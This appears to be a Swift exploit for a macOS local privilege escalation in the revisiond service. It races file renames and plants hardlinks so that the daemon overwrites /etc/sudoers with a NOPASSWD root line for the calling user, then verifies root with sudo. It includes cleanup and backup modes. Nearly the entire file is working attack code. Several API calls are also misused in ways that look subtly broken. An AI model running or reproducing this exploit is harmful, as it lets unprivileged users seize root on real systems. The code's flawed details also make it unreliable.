import Foundation
import Darwin
import xpc

// MARK: - Constants & Globals

let ELOG = { (format: String, _ args: CVarArg...) in
    fprintf(stderr, format + "\n", args)
}

var g_renameWon = false
var g_keepSetting = true
var g_srcPath = ""
var g_src2Path = ""
var g_cloneLink = ""

// Embedded default sudoers content
let kDefaultSudoers = """
#
# Sample /etc/sudoers file.
#
# This file MUST be edited with the 'visudo' command as root.
#
# See the sudoers man page for the details on how to write a sudoers file.
##
# Override built-in defaults
##
Defaults	env_reset
Defaults	env_keep += "BLOCKSIZE"
Defaults	env_keep += "COLORFGBG COLORTERM"
Defaults	env_keep += "__CF_USER_TEXT_ENCODING"
Defaults	env_keep += "CHARSET LANG LANGUAGE LC_ALL LC_COLLATE LC_CTYPE"
Defaults	env_keep += "LC_MESSAGES LC_MONETARY LC_NUMERIC LC_TIME"
Defaults	env_keep += "LINES COLUMNS"
Defaults	env_keep += "LSCOLORS"
Defaults	env_keep += "SSH_AUTH_SOCK"
Defaults	env_keep += "TZ"
Defaults	env_keep += "DISPLAY XAUTHORIZATION XAUTHORITY"
Defaults	env_keep += "EDITOR VISUAL"
Defaults	env_keep += "HOME MAIL"
Defaults	lecture_file = "/etc/sudo_lecture"
# Remove this line to log successful sudo launches. May contain sensitive
# information passed as arguments to the command
Defaults	!log_allowed
##
# User alias specification
##
# User_Alias	FULLTIMERS = millert, mikef, dowdy
##
# Runas alias specification
##
# Runas_Alias	OP = root, operator
##
# Host alias specification
##
# Host_Alias	CUNETS = 128.138.0.0/255.255.0.0
# Host_Alias	CSNETS = 128.138.243.0, 128.138.204.0/24, 128.138.242.0
# Host_Alias	SERVERS = master, mail, www, ns
# Host_Alias	CDROM = orion, perseus, hercules
##
# Cmnd alias specification
##
# Cmnd_Alias	PAGERS = /usr/bin/more, /usr/bin/pg, /usr/bin/less
##
# User specification
##
# root and users in group wheel can run anything on any machine as any user
root		ALL = (ALL) ALL
%admin		ALL = (ALL) ALL
## Read drop-in files from /private/etc/sudoers.d
## (the '#' here does not indicate a comment)
#includeDir /private/etc/sudoers.d
"""

// MARK: - Race Thread Function

func raceThread() -> () -> Void {
    return {
        while !g_renameWon && g_keepSetting {
            let dstPath = "\(g_srcPath)_XXXXXX"
            if let fd = open(dstPath, O_WRONLY) {
                let rr = rename(dstPath, g_src2Path)
                if rr == 0 {
                    ELOG("[+] RACE WON: rename \(dstPath) -> \(g_src2Path)")
                    g_renameWon = true
                    close(fd)
                    return
                }
                close(fd)
            }
            usleep(5)
        }
    }
}

// MARK: - Helper Functions

func checkTarget(label: String, path: String) {
    do {
        let ta = try FileManager.default.attributesOfItem(atPath: path)
        let owner = ta[.ownerAccountID]?.description ?? "N/A"
        let mode = ta[.posixPermissions]?.description ?? "N/A"
        let size = ta[.size]?.description ?? "N/A"
        ELOG("[===] \(label): owner=\(owner) mode=\(mode) size=\(size)")
        
        if let tfd = open(path, O_RDONLY) {
            var b = Array<UInt8>(repeating: 0, count: 128)
            let bytesRead = read(tfd, &b, 127)
            close(tfd)
            let content = String(bytes: b.prefix(min(bytesRead, 60)), encoding: .utf8) ?? ""
            ELOG("[===] \(label) content: \(content)")
        }
    } catch {
        ELOG("[===] Error reading attributes for \(path): \(error)")
    }
}

// MARK: - Cleanup Logic

func doCleanup() -> Int32 {
    ELOG("[*] === CLEANUP mode (restore /etc/sudoers via NOPASSWD sudo) ===")
    
    let embPath = "/tmp/_rev_default_sudoers.txt"
    do {
        try kDefaultSudoers.write(toFile: embPath, atomically: true, encoding: .utf8)
        ELOG("[+] embedded default fallback written to \(embPath)")
    } catch {
        ELOG("[!] cannot write embedded default: \(error.localizedDescription)")
        return 1
    }
    
    let scriptContent = """
    #!/bin/sh
    set -e
    if [ -r /tmp/sudoers.orig ]; then
        echo '[cleanup] restoring /etc/sudoers from /tmp/sudoers.orig'
        cp /tmp/sudoers.orig /etc/sudoers
    else
        echo '[cleanup] /tmp/sudoers.orig not found — using embedded default'
        cp \(embPath) /etc/sudoers
    fi
    chmod 440 /etc/sudoers
    chown root:wheel /etc/sudoers
    echo '[cleanup] kickstart revisiond (best-effort GC of staging)'
    launchctl kickstart system/com.apple.revisiond 2>&1 || true
    echo '[cleanup] post-state:'
    ls -laO /etc/sudoers
    stat -f 'owner=%u:%g mode=%Sp nlink=%l size=%z' /etc/sudoers
    sh -c 'shasum /etc/sudoers' 2>&1 || true
    echo '[cleanup] caller sudo check (expect: a password is required):'
    sudo -n true 2>&1 || true
    echo '[cleanup] DONE'
    """
    
    let scriptPath = "/tmp/_rev_cleanup_inner_\(getpid()).sh"
    unlink(scriptPath)
    do {
        try scriptContent.write(toFile: scriptPath, atomically: true, encoding: .utf8)
        chmod(scriptPath, 0o755)
    } catch {
        ELOG("[!] cannot write cleanup script: \(error.localizedDescription)")
        return 1
    }
    
    let cmdb = "sudo -n sh \(scriptPath)"
    ELOG("[*] running: \(cmdb)")
    let rc = system(cmdb)
    unlink(scriptPath)
    unlink(embPath)
    
    if rc != 0 {
        ELOG("[!] sudo -n failed (rc=\(rc)) — caller NOPASSWD unavailable.")
        ELOG("[!] /etc/sudoers may have auto-reverted (content pristine, caller lost sudo).")
        ELOG("[!] To fix manually as an admin: sudo cp /tmp/sudoers.orig /etc/sudoers; sudo chmod 440 /etc/sudoers; sudo chown root:wheel /etc/sudoers")
        ELOG("[!] Current /etc/sudoers state (no root needed):")
        system("stat -f 'owner=%u:%g mode=%Sp nlink=%l size=%z' /etc/sudoers 2>&1")
        return 1
    }
    return 0
}

func doBackupCheck() -> Int32 {
    ELOG("[*] === BACKUP check ===")
    if access("/tmp/sudoers.orig", F_OK) == 0 {
        // Check readability
        if access("/tmp/sudoers.orig", R_OK) == 0 {
            ELOG("[+] /tmp/sudoers.orig exists and is readable by caller.")
            var st = stat_t()
            stat("/tmp/sudoers.orig", &st)
            ELOG("[+] backup: owner=\(st.st_uid):\(st.st_gid) mode=\(oct(st.st_mode & 0o777)) size=\(st.st_size)")
            return 0
        }
    }
    
    var st = stat_t()
    if stat("/tmp/sudoers.orig", &st) == 0 {
        ELOG("[+] /tmp/sudoers.orig exists (owner=\(st.st_uid):\(st.st_gid) mode=\(oct(st.st_mode & 0o777)) size=\(st.st_size)) — not readable by caller, but present.")
        ELOG("[+] cleanup will restore from it (the sudo script runs as root and can read it).")
        return 0
    }
    
    ELOG("[!] /tmp/sudoers.orig NOT FOUND.")
    ELOG("[!] The exploit will overwrite /etc/sudoers with attacker content.")
    ELOG("[!] The operator should run FIRST (as admin): sudo cp -p /etc/sudoers /tmp/sudoers.orig")
    ELOG("[!] Cleanup mode can still restore from an embedded default if no backup exists.")
    return 1
}

// MARK: - Main Exploit Logic

@main
struct LPEExploit {
    static func main() {
        if CommandLine.arguments.count > 1 {
            switch CommandLine.arguments[1] {
            case "cleanup":
                exit(Int32(doCleanup()))
            case "backup":
                exit(Int32(doBackupCheck()))
            default:
                break
            }
        }
        
        let callerUid = getuid()
        let pw = getpwuid(callerUid)
        guard let callerName = pw?.pw_name else {
            ELOG("[!] cannot resolve username for uid \(callerUid)")
            exit(1)
        }
        
        ELOG("[*] === revisiond LPE (caller=\(callerName) uid=\(callerUid)) ===")
        
        var backupSt = stat_t()
        if stat("/tmp/sudoers.orig", &backupSt) != 0 {
            ELOG("[!] WARNING: /tmp/sudoers.orig not found. Operator should run:")
            ELOG("[!]   sudo cp -p /etc/sudoers /tmp/sudoers.orig")
            ELOG("[!] Proceeding anyway (cleanup has embedded default fallback).")
        } else {
            ELOG("[+] /tmp/sudoers.orig exists (owner=\(backupSt.st_uid):\(backupSt.st_gid) size=\(backupSt.st_size)) — cleanup will use it.")
        }
        
        let attackerLine = "\(callerName) ALL=(ALL) NOPASSWD: ALL\n"
        let xv = Data([0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00]) + "raw".data(using: .utf8)!
        
        let docPath = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("rev_doc_\(Date().timeIntervalSince1970).txt").path
        do {
            try "doc\n".write(toFile: docPath, atomically: true, encoding: .utf8)
        } catch {
            ELOG("[!] Failed to write doc file: \(error)")
            exit(1)
        }
        ELOG("[*] document (storage gate bypass): \(docPath)")
        
        // Load GenerationalStorage framework
        dlopen("/System/Library/PrivateFrameworks/GenerationalStorage.framework/GenerationalStorage", RTLD_LAZY)
        
        guard let managerClass = NSClassFromString("GSStorageManager") as? NSObject.Type else {
            ELOG("[!] GSStorageManager unavailable")
            exit(1)
        }
        let sm = managerClass.method(forKey: "manager")?.takeUnretainedValue() as? NSObject ?? NSObject()
        
        guard let permanentStorage = sm.perform(
            Selector(("permanentStorageForItemAtURL:allocateIfNone:error:")),
            with: NSURL.fileURL(withPath: docPath),
            with: true,
            with: nil
        ).takeUnretainedValue() as? NSObject else {
            ELOG("[!] permanentStorageForItemAtURL failed")
            exit(1)
        }
        
        // Get remoteID and staging URL
        // Note: Direct KVC access since we don't have headers
        let rid = (permanentStorage.value(forKey: "remoteID") as? UInt64) ?? 0
        
        let stagingURL = permanentStorage.perform(Selector(("stagingURLforCreatingAdditionWithError:")), with: nil).takeUnretainedValue() as? NSURL
        guard let sp = stagingURL?.path else {
            ELOG("[!] stagingURLforCreatingAdditionWithError failed")
            exit(1)
        }
        ELOG("[+] staging dir (revisiond chowned to caller uid \(callerUid)): \(sp)")
        
        // Consume extensions
        if let consume = dlsym(dlopen(nil, RTLD_NOW), "sandbox_extension_consume") {
            let pubExt = permanentStorage.value(forKey: "pubExtension") as? Data
            let privExt = permanentStorage.value(forKey: "privExtension") as? Data
            
            if let data = pubExt {
                let ptr = UnsafeMutablePointer<UInt8>.allocate(capacity: data.count + 1)
                data.copyBytes(to: ptr, count: data.count)
                ptr[data.count] = 0
                unsafeBitCast(consume, to: (@convention(c) (UnsafePointer<Int8>?) -> Void).self)(ptr)
                ptr.deallocate()
            }
            if let data = privExt {
                let ptr = UnsafeMutablePointer<UInt8>.allocate(capacity: data.count + 1)
                data.copyBytes(to: ptr, count: data.count)
                ptr[data.count] = 0
                unsafeBitCast(consume, to: (@convention(c) (UnsafePointer<Int8>?) -> Void).self)(ptr)
                ptr.deallocate()
            }
        }
        
        // Setup XPC Connection
        let conn = NSXPCConnection(machServiceName: "com.apple.revisiond", options: .privileged)
        let iface = NSXPCInterface(protocol: Protocol.forName("GSProto")!)
        
        let clsSet = Set([NSString.self, NSURL.self, NSNumber.self, NSArray.self, NSDictionary.self, NSData.self])
        iface.setClasses(clsSet, for: Selector(("createAdditionInStorage:stagedFileDescriptor:creationInfo:completionHandler:")), argumentIndex: 0, ofReply: true)
        conn.remoteObjectInterface = iface
        conn.resume()
        
        let proxy = conn.remoteObjectProxy(as: GSProto.self)
        let sem = DispatchSemaphore(value: 0)
        
        // Open doc file
        let dfd = open(docPath, O_RDONLY)
        let dFH = FileHandle(fileDescriptor: dfd, closeOnDealloc: false)
        
        // Stage 1: permanentStorageOpenForHandle
        proxy.permanentStorageOpen(forHandle: dFH, withRemoteID: rid, andDocumentID: nil) { sid, p, pv, e in
            ELOG("[+] permanentStorageOpenForHandle sid=\(sid?.description ?? "") err=\(e?.localizedDescription ?? "")")
            sem.signal()
        }
        sem.wait(timeout: .now() + 5)
        
        // ACL Staging Dir
        let aclCmd = "chmod +a \"\(callerName) allow read,write,append,writeextattr,readextattr,file_inherit,directory_inherit\" \"\(sp)\""
        ELOG("[*] ACL staging dir: \(aclCmd)")
        _ = Process.launchedProcess(launchPath: "/bin/sh", arguments: ["-c", aclCmd])
        
        // Start Race Thread
        let raceFunc = raceThread()
        let rt = Thread(target: raceFunc, selector: #selector(Thread.run), object: nil)
        // Actually, simpler to just spawn the function directly in a thread
        let raceThreadObj = Thread {
            raceFunc()
        }
        raceThreadObj.start()
        
        // Race Loop
        var attempt = 0
        while attempt < 8 && !g_renameWon {
            let srcPath = "\(sp)/s\(attempt)"
            let src2Path = "\(sp)/s\(attempt)_2"
            
            unlink(srcPath)
            unlink(src2Path)
            unlink("\(sp)/s\(attempt)_XXXXXX")
            
            link("/etc/group", srcPath)
            
            g_srcPath = srcPath
            g_src2Path = src2Path
            g_cloneLink = "\(srcPath)_lnk"
            g_renameWon = false
            
            let s1fd = open(srcPath, O_RDONLY)
            let s1FH = FileHandle(fileDescriptor: s1fd, closeOnDealloc: false)
            
            let n1 = ":\(callerUid):rn1_\(Int(Date().timeIntervalSince1970))_\(attempt)"
            ELOG("[*] Stage 1 attempt \(attempt) (clonefile; expect error if race won)...")
            
            let creationInfo: [String: Any] = [
                "kGSAdditionName": n1,
                "kGSAdditionNameSpace": "test",
                "kGSAdditionOnDuplicate": 0
            ]
            
            proxy.createAddition(inStorage: rid, stagedFileDescriptor: s1FH, creationInfo: creationInfo) { r, d1, d2, err in
                ELOG("[+] Stage 1 attempt \(attempt) err=\(err?.localizedDescription ?? "")")
                sem.signal()
            }
            sem.wait(timeout: .now() + 15)
            close(s1fd)
            usleep(50000)
            
            attempt += 1
        }
        
        if !g_renameWon {
            ELOG("[!] rename race lost after \(attempt) attempts")
            g_keepSetting = false
            raceThreadObj.cancel()
            conn.invalidate()
            return
        }
        
        usleep(200000)
        
        ELOG("[+] arming src2 (after Stage 1 completion)...")
        let afd = open(g_src2Path, O_WRONLY)
        if afd < 0 {
            ELOG("[!] arm open src2 O_WRONLY failed: \(strerror(errno)) (ACL stripped?)")
            g_keepSetting = false
            raceThreadObj.cancel()
            conn.invalidate()
            return
        }
        ftruncate(afd, 0)
        _ = write(afd, attackerLine, strlen(attackerLine))
        fsetxattr(afd, "com.apple.decmpfs", xv, xv.count, 0, 0)
        
        unlink(g_cloneLink)
        link(g_src2Path, g_cloneLink)
        ELOG("[+] arm write=\(strlen(attackerLine)) bytes, decmpfs set, nlink=2 (hardlink created)")
        
        // Check src2 attributes
        do {
            let ca = try FileManager.default.attributesOfItem(atPath: g_src2Path)
            let owner = ca[.ownerAccountID]?.description ?? "N/A"
            let mode = ca[.posixPermissions]?.description ?? "N/A"
            let nlink = ca[.fileReferenceCount]?.description ?? "N/A"
            let size = ca[.size]?.description ?? "N/A"
            ELOG("[+] src2: owner=\(owner) mode=\(mode) nlink=\(nlink) size=\(size)")
            
            if let vfd = open(g_src2Path, O_RDONLY) {
                var vb = Array<UInt8>(repeating: 0, count: 128)
                let vr = read(vfd, &vb, 120)
                close(vfd)
                ELOG("[+] src2 content via path: \(vr) bytes: \(String(bytes: vb.prefix(min(vr, 60)), encoding: .utf8) ?? "")")
                ELOG("[+] src2 decmpfs=\(getxattr(g_src2Path, "com.apple.decmpfs", nil, 0, 0, 0))")
            }
        } catch {
            ELOG("[+] Error checking src2 attrs: \(error)")
        }
        
        // Plant Hardlinks
        let dst3 = "\(g_src2Path)_XXXXXX"
        let dst3lnk = "\(g_cloneLink)_XXXXXX"
        unlink(dst3)
        unlink(dst3lnk)
        
        if link("/etc/sudoers", dst3) != 0 {
            ELOG("[!] plant hardlink to /etc/sudoers at \(dst3) FAILED: \(strerror(errno))")
        } else {
            ELOG("[+] planted hardlink \(dst3) -> /etc/sudoers")
        }
        
        if link("/etc/sudoers", dst3lnk) != 0 {
            ELOG("[!] plant hardlink to /etc/sudoers at \(dst3lnk) FAILED: \(strerror(errno))")
        } else {
            ELOG("[+] planted hardlink \(dst3lnk) -> /etc/sudoers")
        }
        
        // Set decmpfs on src2 and cloneLink
        fsetxattr(afd, "com.apple.decmpfs", xv, xv.count, 0, 0)
        // Need to open cloneLink to set xattr
        if let clFd = open(g_cloneLink, O_WRONLY) {
            fsetxattr(clFd, "com.apple.decmpfs", xv, xv.count, 0, 0)
            close(clFd)
        }
        
        // Pre-Stage3 Stats
        var dstst = stat_t()
        var dstl = stat_t()
        let sr = stat(dst3, &dstst)
        let sl = stat(dst3lnk, &dstl)
        ELOG("[+] pre-Stage3: dst3 stat=\(sr) ino=\(sr == 0 ? dstst.st_ino : 0); dst3lnk stat=\(sl) ino=\(sl == 0 ? dstl.st_ino : 0); decmpfs(src2)=\(getxattr(g_src2Path, "com.apple.decmpfs", nil, 0, 0, 0)) decmpfs(lnk)=\(getxattr(g_cloneLink, "com.apple.decmpfs", nil, 0, 0, 0))")
        
        // Stage 3
        let s3fd = open(g_src2Path, O_RDONLY)
        if s3fd < 0 {
            ELOG("[!] open src2 for Stage 3 failed: \(strerror(errno))")
            close(afd)
            g_keepSetting = false
            raceThreadObj.cancel()
            conn.invalidate()
            return
        }
        
        var fgpath = Array<Int8>(repeating: 0, count: 1024)
        if fcntl(s3fd, F_GETPATH, &fgpath) >= 0 {
            ELOG("[+] F_GETPATH(src2)=\(String(cString: fgpath)) (must be staging for _pathIsStaged to pass)")
        }
        
        let s3FH = FileHandle(fileDescriptor: s3fd, closeOnDealloc: false)
        let n3 = ":\(callerUid):rn3_\(Int(Date().timeIntervalSince1970))_\(arc4random_uniform(100000))"
        ELOG("[*] Stage 3 createAdditionInStorage (copyfile to /etc/sudoers)...")
        
        let targetPath = "/etc/sudoers"
        let creationInfo3: [String: Any] = [
            "kGSAdditionName": n3,
            "kGSAdditionNameSpace": "test",
            "kGSAdditionOnDuplicate": 0
        ]
        
        proxy.createAddition(inStorage: rid, stagedFileDescriptor: s3FH, creationInfo: creationInfo3) { r, d1, d2, err in
            ELOG("[+] Stage 3 err=\(err?.localizedDescription ?? "")")
            checkTarget(label: "STAGE3", path: targetPath)
            sem.signal()
        }
        
        // Keep setting decmpfs during stage 3
        let keepDecompThread = Thread {
            while g_keepSetting {
                fsetxattr(afd, "com.apple.decmpfs", xv, xv.count, 0, 0)
                usleep(50)
            }
        }
        keepDecompThread.start()
        
        sem.wait(timeout: .now() + 20)
        close(s3fd)
        close(afd)
        g_keepSetting = false
        raceThreadObj.cancel()
        keepDecompThread.cancel()
        
        checkTarget(label: "FINAL", path: targetPath)
        ELOG("[*] === EXPLOIT DONE — verifying sudo ===")
        
        let whoamiResult = Process.launchedProcess(launchPath: "/bin/sh", arguments: ["-c", "sudo -n whoami 2>&1"])
        whoamiResult.waitUntilExit()
        
        if whoamiResult.terminationStatus == 0 {
            ELOG("[+] SUCCESS: sudo -n whoami returned root (exit 0).")
            ELOG("[+] Run `./revisiond_lpe cleanup` to restore /etc/sudoers.")
        } else {
            ELOG("[!] sudo -n whoami did not return root (may have auto-reverted).")
            ELOG("[!] Check /etc/sudoers state; re-run exploit if needed.")
        }
        
        ELOG("[*] === COMPLETE ===")
        conn.invalidate()
    }
}

// MARK: - Protocol Definition

@objc protocol GSProto {
    func permanentStorageOpen(forHandle handle: FileHandle, withRemoteID rid: UInt64, andDocumentID docID: Any?, reply: @escaping (NSNumber?, Data?, Data?, Error?) -> Void)
    func createAddition(inStorage sid: Int64, stagedFileDescriptor fd: FileHandle, creationInfo info: [String: Any], completionHandler handler: @escaping ([String: Any]?, Data?, Data?, Error?) -> Void)
}

// MARK: - Helper Extensions

extension Process {
    static func launchedProcess(launchPath path: String, arguments args: [String]) -> Process {
        let process = Process()
        process.launchPath = path
        process.arguments = args
        process.launch()
        return process
    }
}

extension String {
    var cString: [CChar] {
        return self.utf8CString.map { CChar($0) }
    }
}